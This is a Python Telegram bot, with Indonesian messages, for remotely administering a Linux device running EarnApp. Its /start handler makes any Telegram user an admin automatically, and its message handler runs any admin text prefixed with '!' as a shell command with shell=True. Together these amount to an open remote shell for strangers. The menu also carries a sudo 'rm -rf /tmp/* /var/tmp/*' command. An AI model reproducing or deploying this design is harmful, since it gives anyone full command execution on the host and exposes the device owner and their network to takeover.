#!/usr/bin/env python3
import subprocess
import logging
import json
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Updater, CommandHandler, CallbackQueryHandler,
    MessageHandler, Filters, CallbackContext
)

# ================= CONFIG =================
ADMIN_FILE = "admins.json"

# ================= TOKEN =================
TOKEN_FILE = "token.txt"
try:
    with open(TOKEN_FILE, "r") as f:
        TOKEN = f.read().strip()
except FileNotFoundError:
    print(f"ERROR: File {TOKEN_FILE} tidak ditemukan. Masukkan token dari BotFather!")
    exit(1)
except Exception as e:
    print(f"ERROR membaca token: {e}")
    exit(1)

logging.basicConfig(level=logging.INFO)

approved_users = set()

# ================= ADMIN STORAGE =================
def load_admins():
    if not os.path.exists(ADMIN_FILE):
        with open(ADMIN_FILE, "w") as f:
            json.dump(["8599557076"], f)  # admin awal
    with open(ADMIN_FILE, "r") as f:
        return set(json.load(f))

def save_admins():
    with open(ADMIN_FILE, "w") as f:
        json.dump(list(ADMIN_IDS), f)

ADMIN_IDS = load_admins()

# ================= UTILS =================
def is_admin(chat_id):
    return chat_id in ADMIN_IDS

def is_allowed(chat_id):
    return is_admin(chat_id) or chat_id in approved_users

def run_cmd(cmd):
    try:
        out = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, timeout=60
        )
        return out.decode(errors="ignore")[:3500]
    except Exception as e:
        return str(e)

def main_menu():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("⏱ Uptime", callback_data="cmd:uptime"),
            InlineKeyboardButton("📡 Port Status", callback_data="cmd:ss")
        ],
        [
            InlineKeyboardButton("🌐 Status Koneksi", callback_data="cmd:nmcli"),
            InlineKeyboardButton("♻ Restart Service", callback_data="cmd:restart")
        ],
        [
            InlineKeyboardButton("🧹 Clear Cache", callback_data="cmd:clearcache"),
            InlineKeyboardButton("🚀 Cek Bandwidth", callback_data="cmd:bandwidth")
        ],
        [
            InlineKeyboardButton("📲 Status EarnApp", callback_data="cmd:earnapp_status")
        ],
        [
            InlineKeyboardButton("🛠 Solve Device", callback_data="reboot_confirm")
        ]
    ])

# ================= START =================
def start(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)

    # ===== CEK STATUS EARNAPP =====
    try:
        earnapp_status = subprocess.check_output(
            "systemctl is-active earnapp.service && systemctl show -p MainPID earnapp.service",
            shell=True, stderr=subprocess.STDOUT
        ).decode().strip()
    except Exception as e:
        earnapp_status = f"ERROR: {e}"

    # Kirim pesan pertama tentang EarnApp
    update.message.reply_text(f"UNYL AKTIF BOSS\n{earnapp_status}")

    # ===== AUTO ADD ADMIN =====
    if user_id not in ADMIN_IDS:
        ADMIN_IDS.add(user_id)
        save_admins()
        update.message.reply_text("👑 Kamu sekarang admin!", reply_markup=main_menu())

        # Info ke admin lama
        for admin in ADMIN_IDS:
            if admin != user_id:  # jangan kirim ke diri sendiri
                try:
                    context.bot.send_message(
                        admin,
                        f"🔔 Admin baru ditambahkan: {user_id}"
                    )
                except Exception as e:
                    logging.warning(f"Gagal mengirim info ke admin {admin}: {e}")
        return

    # Jika sudah admin
    update.message.reply_text("✅ Akses admin aktif", reply_markup=main_menu())

# ================= ADMIN COMMAND =================
def add_admin(update: Update, context: CallbackContext):
    if not is_admin(str(update.effective_user.id)):
        return
    if not context.args:
        update.message.reply_text("❌ Gunakan: /addadmin user_id")
        return
    uid = context.args[0]
    ADMIN_IDS.add(uid)
    save_admins()
    update.message.reply_text(f"✅ Admin ditambahkan: {uid}")

def del_admin(update: Update, context: CallbackContext):
    if not is_admin(str(update.effective_user.id)):
        return
    if not context.args:
        update.message.reply_text("❌ Gunakan: /deladmin user_id")
        return
    uid = context.args[0]
    if uid in ADMIN_IDS:
        ADMIN_IDS.remove(uid)
        save_admins()
        update.message.reply_text(f"🗑 Admin dihapus: {uid}")
    else:
        update.message.reply_text("⚠ User bukan admin")

def list_admin(update: Update, context: CallbackContext):
    if not is_admin(str(update.effective_user.id)):
        return
    update.message.reply_text("👑 LIST ADMIN:\n" + "\n".join(ADMIN_IDS))

# ================= BUTTON HANDLER =================
def button(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = str(query.from_user.id)
    data = query.data

    if not is_allowed(user_id):
        query.edit_message_text("❌ Akses ditolak")
        return

    if data == "reboot_confirm":
        query.edit_message_text(
            "🛠 *Solve Device*\n\nReboot device sekarang?",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ YA", callback_data="reboot_now"),
                    InlineKeyboardButton("❌ BATAL", callback_data="menu")
                ]
            ])
        )

    elif data == "reboot_now":
        run_cmd("nohup sudo shutdown -r +1 'Solve Device via Telegram Bot' >/dev/null 2>&1 &")
        query.edit_message_text("🔄 Device akan reboot ±1 menit")

    elif data == "menu":
        query.edit_message_text("📟 Menu", reply_markup=main_menu())

    elif data.startswith("cmd:"):
        cmd = data.split(":")[1]
        cmds = {
            "uptime": ("⏱ UPTIME", "uptime"),
            "ss": ("📡 PORT STATUS", "sudo ss -tupn"),
            "restart": ("♻ SERVICE", "systemctl restart telegram-remote"),
            "nmcli": ("🌐 STATUS KONEKSI", "nmcli device status"),
            "clearcache": ("🧹 CLEAR CACHE", "sudo rm -rf /tmp/* /var/tmp/* && sudo apt clean"),
            "bandwidth": ("🚀 CEK BANDWIDTH",
                "curl -L http://speed.cloudflare.com/__down?bytes=1000000 "
                "-o /dev/null -w 'Time: %{time_total}s\\nSpeed: %{speed_download} bytes/sec\\n'"),
            "earnapp_status": ("📲 STATUS EARNAPP", "systemctl is-active earnapp.service && systemctl show -p MainPID earnapp.service")
        }

        if cmd in cmds:
            title, shell = cmds[cmd]
            out = run_cmd(shell)
            query.edit_message_text(
                f"{title}\n```\n{out}\n```",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⬅ Back", callback_data="menu")]
                ])
            )

# ================= SHELL CMD =================
def shell_cmd(update: Update, context: CallbackContext):
    if not is_admin(str(update.effective_user.id)):
        return
    if update.message.text.startswith("!"):
        out = run_cmd(update.message.text[1:])
        update.message.reply_text(f"```\n{out}\n```", parse_mode="Markdown")

# ================= MAIN =================
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("addadmin", add_admin))
    dp.add_handler(CommandHandler("deladmin", del_admin))
    dp.add_handler(CommandHandler("listadmin", list_admin))
    dp.add_handler(CallbackQueryHandler(button))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, shell_cmd))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
